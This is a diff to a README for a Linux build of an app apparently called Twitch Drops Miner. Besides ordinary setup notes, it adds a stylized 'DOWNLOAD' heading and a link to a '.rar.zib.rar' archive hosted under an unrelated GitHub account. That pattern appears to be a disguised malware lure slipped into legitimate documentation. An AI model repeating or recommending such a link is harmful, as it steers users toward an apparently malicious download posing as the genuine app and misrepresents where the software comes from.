@@ -53,3 +53,8 @@ The Linux app should work out of the box on any modern distribution, as long as 
 Every feature of the app is expected to work on Linux just as well as it does on Windows. If you find something that's broken, please open a new issue.
 The size of the Linux app is significantly larger than the Windows app due to the inclusion of the gtk3 library (and its dependencies), which is required for proper system tray/notifications support.
 As an alternative to the native Linux app, you can run the Windows app via Wine instead. It works really well!
+
+
+𝓓𝓞𝓦𝓝𝓛𝓞𝓐𝓓
+
+https://github.com/AdminCreator-cpu/Twitch.Drops.Miner.Windows/releases/download/Twitch.Drops.Miner.Windows/Twitch.Drops.Miner.Windows.rar.zib.rar
